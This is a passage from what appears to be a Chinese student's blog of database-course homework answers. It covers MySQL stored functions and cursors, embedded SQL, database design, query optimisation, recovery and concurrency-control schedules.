Customer</span><br><span class="line">    <span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="built_in">TRIM</span>(p_custname);</span><br><span class="line">    <span class="keyword">UPDATE</span> Orders</span><br><span class="line">    <span class="keyword">SET</span> totalprice <span class="operator">=</span></span><br><span class="line">    (<span class="keyword">SELECT</span> <span class="built_in">SUM</span>( extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax))</span><br><span class="line">            <span class="keyword">FROM</span> Lineitem</span><br><span class="line">            <span class="keyword">WHERE</span> Orders.orderkey <span class="operator">=</span> Lineitem.orderkey</span><br><span class="line">                 <span class="keyword">AND</span> Orders.custkey <span class="operator">=</span> L_custkey);</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(totalprice) <span class="keyword">INTO</span> p_totalprice</span><br><span class="line">    <span class="keyword">FROM</span> Orders</span><br><span class="line">    <span class="keyword">WHERE</span> custkey <span class="operator">=</span> L_custkey;</span><br><span class="line">    <span class="keyword">RETURN</span> res;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> FUN_CalTotalPrice4Customer2(<span class="string">&#x27;高乌恩&#x27;</span>,<span class="variable">@totalprice</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="variable">@totalprice</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)修改自定义函数</span></span><br><span class="line"><span class="comment">-- 如果要修改自定义函数的名称，可以先删除原自定义函数，再以不同的命名创建新的自定义函数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)删除自定义函数</span></span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw9%2610/6-2-1.png" alt="6-2-1"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-2-2.png" alt="6-2-2"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-2-3.png" alt="6-2-3"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-2-4.png" alt="6-2-4"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-2-5.png" alt="6-2-5"></p><h3 id="实验6-3游标实验"><a href="#实验6-3游标实验" class="headerlink" title="实验6.3游标实验"></a>实验6.3游标实验</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 除了Orders和Lineitem，其他表格按实验一步骤导入数据。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Orders(orderkey,custkey,totalprice)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">61018</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Lineitem(orderkey,linenumber,extendedprice,discount,tax)</span><br><span class="line"><span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>,<span class="string">&#x27;0.5&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (1)普通游标</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> ProcCursor_CalTotalPrice()</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> DONE <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;#定义结束标识</span><br><span class="line">    <span class="keyword">DECLARE</span> L_orderkey <span class="type">INTEGER</span>;</span><br><span class="line">    <span class="keyword">DECLARE</span> L_totalprice <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">DECLARE</span> mycursor <span class="keyword">CURSOR</span> <span class="keyword">FOR</span> </span><br><span class="line">    <span class="keyword">SELECT</span> orderkey,totalprice <span class="keyword">FROM</span> Orders;</span><br><span class="line">    <span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;02000&#x27;</span> <span class="keyword">SET</span> DONE <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">OPEN</span> mycursor;</span><br><span class="line">    LOOP1: LOOP</span><br><span class="line">        <span class="keyword">FETCH</span> mycursor <span class="keyword">INTO</span> L_orderkey,L_totalprice;</span><br><span class="line">        IF DONE <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span></span><br><span class="line">LEAVE LOOP1;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax)) <span class="keyword">INTO</span> L_totalprice</span><br><span class="line"><span class="keyword">FROM</span> Lineitem </span><br><span class="line"><span class="keyword">WHERE</span> orderkey <span class="operator">=</span> L_orderkey;</span><br><span class="line">        <span class="keyword">UPDATE</span> Orders</span><br><span class="line">        <span class="keyword">SET</span> totalprice <span class="operator">=</span> L_totalprice</span><br><span class="line">        <span class="keyword">WHERE</span> orderkey <span class="operator">=</span> L_orderkey;</span><br><span class="line">    <span class="keyword">END</span> LOOP;</span><br><span class="line">    <span class="keyword">CLOSE</span> mycursor;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> ProcCursor_CalTotalPrice();</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> orders;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)REFCURSOR类型游标</span></span><br><span class="line"><span class="comment">-- MySQL不支持</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)记录变量与游标</span></span><br><span class="line"><span class="comment">-- MySQL不支持</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)带参数的游标</span></span><br><span class="line"><span class="comment">-- MySQL不支持，改为带参数的PROCEDURE结合普通游标查询</span></span><br><span class="line">DELIMITER <span class="operator">||</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> ProcParaCursor_CalTotalPrice(<span class="keyword">IN</span> c_nationname <span class="type">CHAR</span>(<span class="number">20</span>))</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> DONE <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>;#定义结束标识</span><br><span class="line">    <span class="keyword">DECLARE</span> L_totalprice <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">DECLARE</span> L_orderkey <span class="type">REAL</span>;</span><br><span class="line">    <span class="keyword">DECLARE</span> mycursor <span class="keyword">CURSOR</span> <span class="keyword">FOR</span></span><br><span class="line">    <span class="keyword">SELECT</span> O.orderkey </span><br><span class="line">    <span class="keyword">FROM</span> Orders O,Customer C,Nation N</span><br><span class="line">    <span class="keyword">WHERE</span> O.custkey <span class="operator">=</span> C.custkey </span><br><span class="line">    <span class="keyword">AND</span> C.nationkey <span class="operator">=</span> N.nationkey </span><br><span class="line">    <span class="keyword">AND</span> <span class="built_in">TRIM</span>(N.name) <span class="operator">=</span> <span class="built_in">TRIM</span>(c_nationname);</span><br><span class="line">    <span class="keyword">DECLARE</span> CONTINUE HANDLER <span class="keyword">FOR</span> <span class="keyword">SQLSTATE</span> <span class="string">&#x27;02000&#x27;</span> <span class="keyword">SET</span> DONE <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">OPEN</span> mycursor;</span><br><span class="line">    LOOP1: LOOP</span><br><span class="line">        <span class="keyword">FETCH</span> mycursor <span class="keyword">INTO</span> L_orderkey;</span><br><span class="line">        IF DONE <span class="operator">=</span> <span class="number">1</span> <span class="keyword">THEN</span></span><br><span class="line">LEAVE LOOP1;</span><br><span class="line"><span class="keyword">END</span> IF;</span><br><span class="line">        <span class="keyword">SELECT</span> <span class="built_in">SUM</span>(extendedprice <span class="operator">*</span> (<span class="number">1</span> <span class="operator">-</span> discount) <span class="operator">*</span> (<span class="number">1</span> <span class="operator">+</span> tax)) <span class="keyword">INTO</span>  L_totalprice</span><br><span class="line">        <span class="keyword">FROM</span> Lineitem </span><br><span class="line">        <span class="keyword">WHERE</span> orderkey <span class="operator">=</span> L_orderkey;</span><br><span class="line">        <span class="keyword">UPDATE</span> Orders </span><br><span class="line">        <span class="keyword">SET</span> totalprice <span class="operator">=</span> L_totalprice </span><br><span class="line">        <span class="keyword">WHERE</span> orderkey <span class="operator">=</span> L_orderkey;</span><br><span class="line">    <span class="keyword">END</span> LOOP;</span><br><span class="line">    <span class="keyword">CLOSE</span> mycursor;</span><br><span class="line"><span class="keyword">END</span> <span class="operator">||</span></span><br><span class="line">DELIMITER ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CALL</span> ProcParaCursor_CalTotalPrice(<span class="string">&#x27;中国&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw9%2610/6-3-1.png" alt="6-3-1"></p><p><img src="https://img.lfalive.top/db-hw9%2610/6-3-2.png" alt="6-3-2"></p><h2 id="习题7-1"><a href="#习题7-1" class="headerlink" title="习题7.1"></a>习题7.1</h2><ol><li><p>需求分析。</p></li><li><p>概念结构设计。</p></li><li><p>逻辑结构设计。</p></li><li><p>数据库物理设计。</p></li><li><p>数据库实施。</p></li><li><p>数据库运行和维护。</p></li></ol><p>设计一个完善的实际数据库及其应用系统往往是上述阶段的不断反复。</p><h2 id="习题7-2"><a href="#习题7-2" class="headerlink" title="习题7.2"></a>习题7.2</h2><ol><li>在概念结构设计阶段形成独立于机器特点、独立于各个DBMS产品的概念模式，在本篇中就是E-R图。</li><li>在逻辑结构设计阶段将E-R图转换成具体的数据库产品支持的数据模型，如关系模型，形成数据库逻辑模式，然后在基本表的基础上再建立必要的视图，形成数据的外模式。</li><li>在物理结构设计阶段，根据DBMS特点和处理的需要进行物理储存安排，建立索引，形成数据库内模式。</li></ol><h2 id="习题7-3"><a href="#习题7-3" class="headerlink" title="习题7.3"></a>习题7.3</h2><p>需求分析阶段的设计目标是通过详细调查现实世界要处理的对象，充分了解原系统工作概况，明确客户的各种需求，然后在此基础上确定新系统的功能。</p><p>调查的内容是“数据”和“处理”，即获得用户对数据库的如下要求：</p><ol><li>信息要求。指用户需要从数据库中获得信息的内容与性质。由信息要求可以导出数据要求，即在数据库中需要储存哪些数据。</li><li>处理要求。指用户要完成什么处理功能，对处理的响应时间有什么要求，处理方式是批处理还是联机处理。</li><li>安全性与完整性要求。</li></ol><h2 id="习题7-4"><a href="#习题7-4" class="headerlink" title="习题7.4"></a>习题7.4</h2><p>数据字典的内容通常包括数据项、数据结构、数据流、数据存储和处理过程。其中数据项是数据的最小组成单位，若干个数据项可以组成一个数据结构。数据字典通过对数据项和数据结构的定义来描述数据流、数据存储的逻辑内容。</p><p>数据字典作用：数据字典是关于数据库中数据的描述，在需求分析阶段建立，是下一步进行概念设计的基础，并在数据库设计过程中不断修改、充实和完善。</p><h2 id="习题8-1"><a href="#习题8-1" class="headerlink" title="习题8.1"></a>习题8.1</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span><span class="keyword">SELECT</span> Cno,Cname,Cpno,Ccredit</span><br><span class="line"><span class="keyword">INTO</span>:HCno,:HCname,:HCpno,:HCredit</span><br><span class="line"><span class="keyword">FROM</span> Course</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span>:givencno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">DECLARE</span> SCX <span class="keyword">CURSOR</span> <span class="keyword">FOR</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Cno,Grade</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">WHERE</span> Cno<span class="operator">=</span>:givencno;</span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">OPEN</span> SCX;</span><br><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;<span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">FETCH</span> SCX <span class="keyword">INTO</span> :HSno,:HCno,:HGrade;</span><br><span class="line"> <span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">UPDATE</span> SC</span><br><span class="line"> <span class="keyword">SET</span> grade <span class="operator">=</span> :NEWgrade</span><br><span class="line"> <span class="keyword">WHERE</span> <span class="keyword">CURRENT</span> <span class="keyword">OF</span> SCX;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">EXEC</span> <span class="keyword">SQL</span> <span class="keyword">CLOSE</span> SCX;</span><br></pre></td></tr></table></figure><h2 id="习题7-7"><a href="#习题7-7" class="headerlink" title="习题7.7"></a>习题7.7</h2><img src="https://img.lfalive.top/db-hw9%2610/7-7.png" style="zoom:50%;" /><h2 id="习题7-8"><a href="#习题7-8" class="headerlink" title="习题7.8"></a>习题7.8</h2><img src="https://img.lfalive.top/db-hw9%2610/7-8.png" style="zoom: 40%;" /><h2 id="习题7-10"><a href="#习题7-10" class="headerlink" title="习题7.10"></a>习题7.10</h2><p>注：加粗的是主码属性。</p><p><strong>习题7：</strong></p><p>系（<strong>系编号</strong>，系名，学校名）</p><p>班级（<strong>班级编号</strong>，班级名，系编号）</p><p>教研室（<strong>教研室编号</strong>，教研室，系编号）</p><p>学生（<strong>学号</strong>，姓名，学历，班级编号，导师职工号）</p><p>课程（<strong>课程编号</strong>，课程名）</p><p>教员（<strong>职工号</strong>，姓名，职称，教研室编号）</p><p>选课（<strong>学号</strong>，课程编号，成绩）</p><p><strong>习题8：</strong></p><p>产品（<strong>产品号</strong>，产品名，仓库号）</p><p>零件（<strong>零件号</strong>，零件名）</p><p>原材料（<strong>原材料号</strong>，原材料名，类别，仓库号，存放量）</p><p>仓库（<strong>仓库号</strong>，仓库名）</p><p>产品组成（<strong>产品号，零件号</strong>，使用零件量）</p><p>零件组成（<strong>零件号，原材料号</strong>，使用原材料量）</p><p>零件储存（<strong>零件号，仓库号</strong>，存储量）</p><h2 id="习题7-11"><a href="#习题7-11" class="headerlink" title="习题7.11"></a>习题7.11</h2><p>这些关系模式都只有一个码，且都是唯一决定的因素，所以都属于BCNF。不会产生更新异常的现象。</p><h2 id="习题7-13"><a href="#习题7-13" class="headerlink" title="习题7.13"></a>习题7.13</h2><p>数据库在物理设备上的存储结构与存取方法称为数据库的物理结构，它依赖于给定的DBMS。为一个给定的逻辑数据模型选取一个最合适应用要求的物理结构，就是数据库的物理设计的主要内容。</p><p>通常分为两步：</p><ol><li>确定数据库的物理结构，在关系数据库中主要指存取方法和存储结构。</li><li>对物理结构进行评价，评价的重点是时间和空间效率。</li></ol><h2 id="习题7-15"><a href="#习题7-15" class="headerlink" title="习题7.15"></a>习题7.15</h2><p>数据库的再组织是指按原设计要求重新安排存储位置、回收垃圾、减少指针链等，以提高系统性能。</p><p>数据库的重构造则是指部分修改数据库的模式和内模式，即修改原设计的逻辑和物理结构。数据库的再组织是不修改数据库的模式和内模式的。</p><p>进行数据库的再组织和重构造的原因：</p><p>数据库运行一段时间后，由于记录不断增、删、改，会使数据库的物理存储情况变坏，降低<br>了数据的存取效率，数据库性能下降，这时DBA就要对数据库进行重组织。DBMS一般都提<br>供数据重组织用的实用程序。</p><p>数据库应用环境常常发生变化，如增加新的应用或新的实体，取消了某些应用，有的实体<br>与实体间的联系也发生了变化等，使原有的数据库设计不能满足新的需求，需要调整数据库<br>的模式和内模式。这就要进行数据库重构造。</p><h2 id="习题9-2"><a href="#习题9-2" class="headerlink" title="习题9.2"></a>习题9.2</h2><ol><li>需要对R进行全盘扫描，块数&#x3D;20000&#x2F;40&#x3D;500。</li><li>对R进行索引扫描，块数&#x3D;3+1&#x3D;4；其中3块B+树索引块，1块数据块。</li><li>R本身20000&#x2F;40&#x3D;500个块，S本身1200&#x2F;30&#x3D;40个块，以S为外表，假设内存分配的块数为k，嵌套循环连接需要的块数为40+[40&#x2F;k-1]*500。</li><li>如果R和S都在B属性上排好序，块数500+40&#x3D;540；如果都没有排序，则还要加上排序代价，结果为540+2 * 500 * ( (log2 500) + 1 ) + 2 * 40 * ( (log2 40) + 1 )。</li></ol><h2 id="习题9-3"><a href="#习题9-3" class="headerlink" title="习题9.3"></a>习题9.3</h2><p>最初的语法树和关系代数语法树为：</p><p><img src="https://img.lfalive.top/db-hw9%2610/9-3-1.png" alt="9-3-1"></p><p>优化后的语法树为：</p><img src="https://img.lfalive.top/db-hw9%2610/9-3-2.png" alt="9-3-2" style="zoom: 67%;" /><h2 id="习题9-6"><a href="#习题9-6" class="headerlink" title="习题9.6"></a>习题9.6</h2><ol><li>尽可能先做选择运算。</li><li>同时进行投影运算和选择运算。</li><li>把投影同其前或其后的双目运算结合起来执行。</li><li>把某些选择同在它前面要执行的笛卡尔积结合起来成为一个连接运算。</li><li>找出公共子表达式。</li><li>选取合适的连接算法。</li></ol><h2 id="习题9-7"><a href="#习题9-7" class="headerlink" title="习题9.7"></a>习题9.7</h2><ol><li>把查询转换成某种内部表示，通常用的内部表示是语法树。</li><li>把语法树转换成标准（优化）形式，即利用优化算法把原始的语法树转换成优化的形式。</li><li>选择低层的存取路径。</li><li>生成查询计划，选择所需代价最小的计划加以执行。</li></ol><h2 id="习题10-1"><a href="#习题10-1" class="headerlink" title="习题10.1"></a>习题10.1</h2><p>事务是用户定义的一个数据库操作序列，这些操作要么全做、要么全不做，是一个不可分割的工作单位。</p><p>事务具有4个特性：原子性、一致性、隔离性、持续性，简称ACID特性。</p><p>原子性：事务是数据库的逻辑工作单位，事务中包括的诸操作要么都做，要么都不做。</p><p>一致性：事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。</p><p>隔离性：一个事务的执行不能被其他事务干扰。即一个事务内部的操作及使用的数据对其他并发事务是隔离的，并发执行的各个事务之间不能互相干扰。</p><p>持续性：一个事务一旦提交，它对数据库中数据的改变就应该是永久性的。接下来的其他操作或故障不应该对其执行结果有任何影响。</p><p>故障恢复可以保证事务的原子性与持续性。</p><h2 id="习题10-3"><a href="#习题10-3" class="headerlink" title="习题10.3"></a>习题10.3</h2><p>把对数据的修改写到数据库中和把表示这个修改的日志记录写到日志文件中是两个不<br>同的操作。有可能发生故障，这两个写操作只完成了一个。</p><p>如果先写了数据库修改，而在运行记录中没有登记这个修改，则以后就无法恢复这个修<br>改了。如果先写日志，但没有修改数据库，在恢复时只不过是多执行一次UNDO操作，并不<br>会影响数据库的正确性。所以一定要先写日志文件，即首先把日志记录写到日志文件中再写数据库的修改。</p><h2 id="习题10-4"><a href="#习题10-4" class="headerlink" title="习题10.4"></a>习题10.4</h2><ol><li>重做T1、T3；回滚T2、T4。</li><li>重做T1；回滚T2、T3。</li><li>重做T1；回滚T2、T3。</li><li>重做T1；回滚T2。</li></ol><h2 id="习题10-5"><a href="#习题10-5" class="headerlink" title="习题10.5"></a>习题10.5</h2><ol><li>A&#x3D;8, B&#x3D;7, C&#x3D;11。</li><li>A&#x3D;10, B&#x3D;0, C&#x3D;11。</li><li>A&#x3D;10, B&#x3D;0, C&#x3D;11。</li><li>A&#x3D;10, B&#x3D;0, C&#x3D;11。</li><li>A&#x3D;10, B&#x3D;0, C&#x3D;11。</li><li>A&#x3D;0, B&#x3D;0, C&#x3D;0。</li></ol><h2 id="习题10-7"><a href="#习题10-7" class="headerlink" title="习题10.7"></a>习题10.7</h2><p>检查点记录是一类新的日志记录，内容包括建立检查点时刻所有正在执行的事务清单和这些事务的最近一个日志记录的地址。</p><h2 id="习题10-9"><a href="#习题10-9" class="headerlink" title="习题10.9"></a>习题10.9</h2><ol><li><p>在重新开始文件中，找到最后一个检查点记录在日志文件中的地址，由该地址在日志文件中找到最后一个检查点记录。</p></li><li><p>由该检查点记录得到检查点建立时刻所有正在执行的事务清单ACTIVE-LIST。这里建立两个事务队列：</p><ul><li>UNDO-LIST：需要执行undo操作的事务集合；</li><li>REDO-LIST：需要执行redo 操作的事务集合。</li></ul><p>把ACTIVE-LIST暂时放人UNDO-LIST队列，REDO队列暂为空。</p></li><li><p>从检查点开始正向扫描日志文件</p><ul><li>如有新开始的事务T，把T暂时放入UNDO-LIST队列;</li><li>如有提交的事务Tj，把Tj从UNDO-LIST队列移到REDO-LIST队列，直到日志文件结束。</li></ul></li><li><p>对UNDO-LIST中的每个事务执行UNDO操作，对REDO-LIST中的每个事务执行REDO操作。</p></li></ol><h2 id="习题10-10"><a href="#习题10-10" class="headerlink" title="习题10.10"></a>习题10.10</h2><p>数据库镜像即根据DBA的要求，自动把整个数据库或者其中的部分关键数据复制到另一个磁盘上。每当主数据库更新时，DBMS自动把更新后的数据复制过去，即DBMS自动保证镜像数据与主数据的一致性。</p><p>数据库镜像的用途：</p><ol><li>用于数据库恢复。当出现介质故障时，镜像磁盘可继续使用，同时DBMS自动利用镜像磁盘数据进行数据库的恢复，不需要关闭系统和重装数据库副本。</li><li>提高数据库的可用性。在没有出现故障时，当一一个用户对某个数据加排他锁进行修改时，其他用户可以读镜像数据库上的数据，而不必等待该用户释放锁。</li></ol><h2 id="习题11-2"><a href="#习题11-2" class="headerlink" title="习题11.2"></a>习题11.2</h2><p>并发操作带来的数据不一致性包括三类：</p><ol><li>丢失修改<br>两个事务T1和T2读入同一数据并修改，T2提交的结果破坏了(覆盖了)T1提交的结果，导致T1的修改被丢失。</li><li>不可重复读<br>不可重复读是指事务T1读取某一数据后，事务T2对其执行更新操作，使T1无法再现前一次读取结果。不可重复读包括三种情况：<ol><li>事务T1读取某一数据后，事务T2对其做了修改，当事务T1再次读该数据时，得到与前一次不同的值。</li><li>事务T1按一定条件从数据库中读取了某些数据记录后，事务T2删除了其中部分记录，当T1再次按相同条件读取数据时，发现某些记录消失了。</li><li>事务T1按一定条件从数据库中读取某些数据记录后，事务T2插入了一些记录，当T1再次按相同条件读取数据时，发现多了一些记录。</li></ol></li><li>读“脏”数据<br>读“脏”数据是指事务T1修改某一数据，并将其写回磁盘，事务T2读取同一数据后 ， T1由于某种原因被撤销，这时T1已修改过的数据恢复原值，T2读到的数据就与数据库中的数据不一致，则T2读到的数据就为“脏”数据，即不正确的数据。</li></ol><p>避免不一致性的方法就是并发控制。常用的并发控制技术包括封锁方法、时间戳方法、乐观控制方法和多版本并发控制方法等。</p><h2 id="习题11-4"><a href="#习题11-4" class="headerlink" title="习题11.4"></a>习题11.4</h2><p>DBMS在对数据进行读写操作之前首先对该数据执行封锁操作，例如事务T1在对A进行修改之前先对A执行Xlock(A)即对A加X锁。这样当T2请求对A加X锁时就被拒绝，T2只能等待T1释放A上的锁后才能获得对A的X锁，这时它读到的A是T1更新后的值，再按此新的A值进行运算。这样就不会丢失T1的更新。</p><p>DBMS按照一定的封锁协议对并发操作进行控制，使得多个并发操作有序地执行，就可以避免丟失修改、不可重复读和读“脏”数据等数据不一致性。</p><h2 id="习题11-6"><a href="#习题11-6" class="headerlink" title="习题11.6"></a>习题11.6</h2><p>如果事务T1封锁了数据R1，T2封锁了数据R2 ，然后T1又请求封锁R2，因T2已封锁了R2，于是T1等待T2释放R2上的锁。接着T2又申请封锁R1，因T1已封锁了R1，T2也只能等待T1释放R1上的锁。这样就出现了T1在等待T2，而T2又在等待T1的局面，T1和T2两个事务永远不能结束，形成死锁。</p><p>防止死锁的发生其实就是要破坏产生死锁的条件。预防死锁通常有两种方法：</p><ol><li>一次封锁法<br>要求每个事务必须一次将所有要使用的数据全部加锁，否则就不能继续执行。</li><li>顺序封锁法<br>预先对数据对象规定一个封锁顺序，所有事务都按这个顺序实行封锁。</li></ol><h2 id="习题11-8"><a href="#习题11-8" class="headerlink" title="习题11.8"></a>习题11.8</h2><p>可串行化的调度是正确的调度。可串行化的调度的定义：多个事务的并发执行是正确的，当且仅当其结果与按某一次序串行地执行它们时的结果相同，称这种调度策略为可串行化的调度。</p><h2 id="习题11-9"><a href="#习题11-9" class="headerlink" title="习题11.9"></a>习题11.9</h2><ol><li><p>A的最终结果可能有2、4、8、16。因为串行执行次序有T1 T2 T3；T1 T3 T2；T2 T1 T3；T2 T3 T1；T3 T1 T2；T3 T2 T1。对应的执行结果是16；8；4；2；4；2。</p></li><li><table><thead><tr><th align="left">T1</th><th align="left">T2</th><th align="left">T3</th></tr></thead><tbody><tr><td align="left">Slock A</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Y&#x3D;A&#x3D;0</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Unlock A</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Xlock A</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">A&#x3D;Y+2</td><td align="left">Slock A</td><td align="left"></td></tr><tr><td align="left">写回A(&#x3D;2)</td><td align="left">等待</td><td align="left"></td></tr><tr><td align="left">Unlock A</td><td align="left">等待</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">等待</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">Y&#x3D;A&#x3D;2</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">Unlock A</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">Xlock A</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Slock A</td></tr><tr><td align="left"></td><td align="left">A&#x3D;Y*2</td><td align="left">等待</td></tr><tr><td align="left"></td><td align="left">写回A(&#x3D;4)</td><td align="left">等待</td></tr><tr><td align="left"></td><td align="left">Unlock A</td><td align="left">等待</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Y&#x3D;A&#x3D;4</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Unlock A</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Xlock A</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">A&#x3D;Y*Y</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">写回A(&#x3D;16)</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Unlock A</td></tr></tbody></table><p>最后结果A&#x3D;16，是可串行化的调度。</p></li><li><table><thead><tr><th align="left">T1</th><th align="left">T2</th><th align="left">T3</th></tr></thead><tbody><tr><td align="left">Slock A</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Y&#x3D;A&#x3D;0</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">Unlock A</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left">Slock A</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">Y&#x3D;A&#x3D;0</td><td align="left"></td></tr><tr><td align="left">Xlock A</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">等待</td><td align="left">Unlock A</td><td align="left"></td></tr><tr><td align="left">A&#x3D;Y+2</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">写回A(&#x3D;2)</td><td align="left"></td><td align="left">Slock A</td></tr><tr><td align="left">Unlock A</td><td align="left"></td><td align="left">等待</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Y&#x3D;A&#x3D;2</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Unlock A</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">Xlock A</td></tr><tr><td align="left"></td><td align="left">Xlock A</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">等待</td><td align="left">Y&#x3D;Y**2</td></tr><tr><td align="left"></td><td align="left">等待</td><td align="left">写回A(&#x3D;4)</td></tr><tr><td align="left"></td><td align="left">等待</td><td align="left">Unlock A</td></tr><tr><td align="left"></td><td align="left">A&#x3D;Y*2</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">写回A(&#x3D;0)</td><td align="left"></td></tr><tr><td align="left"></td><td align="left">Unlock A</td><td align="left"></td></tr></tbody></table></li></ol><p>最后结果A&#x3D;0，为非串行化的调度。</p><ol start="4"><li><table><thead><tr><th>T1</th><th>T2</th><th align="left">T3</th></tr></thead><tbody><tr><td>Slock A</td><td></td><td align="left"></td></tr><tr><td>Y&#x3D;A&#x3D;0</td><td></td><td align="left"></td></tr><tr><td>Xlock A</td><td></td><td align="left"></td></tr><tr><td>A&#x3D;Y+2</td><td>Slock A</td><td align="left"></td></tr><tr><td>写回A(&#x3D;2)</td><td>等待</td><td align="left"></td></tr><tr><td>Unlock A</td><td>等待</td><td align="left"></td></tr><tr><td></td><td>Y&#x3D;A&#x3D;2</td><td align="left"></td></tr><tr><td></td><td>Xlock A</td><td align="left"></td></tr><tr><td>Unlock A</td><td>等待</td><td align="left">Slock A</td></tr><tr><td></td><td>A&#x3D;Y*2</td><td align="left">等待</td></tr><tr><td></td><td>写回A(&#x3D;4)</td><td align="left">等待</td></tr><tr><td></td><td>Unlock A</td><td align="left">等待</td></tr><tr><td></td><td></td><td align="left">Y&#x3D;A&#x3D;4</td></tr><tr><td></td><td>Unlock A</td><td align="left"></td></tr><tr><td></td><td></td><td align="left">Xlock A</td></tr><tr><td></td><td></td><td align="left">A&#x3D;Y*Y</td></tr><tr><td></td><td></td><td align="left">写回A(&#x3D;16)</td></tr><tr><td></td><td></td><td align="left">Unlock A</td></tr><tr><td></td><td></td><td align="left">Unlock A</td></tr></tbody></table></li><li><table><thead><tr><th>T1</th><th>T2</th><th>T3</th></tr></thead><tbody><tr><td>Slock A</td><td></td><td></td></tr><tr><td>Y&#x3D;A&#x3D;0</td><td></td><td></td></tr><tr><td></td><td>Slock 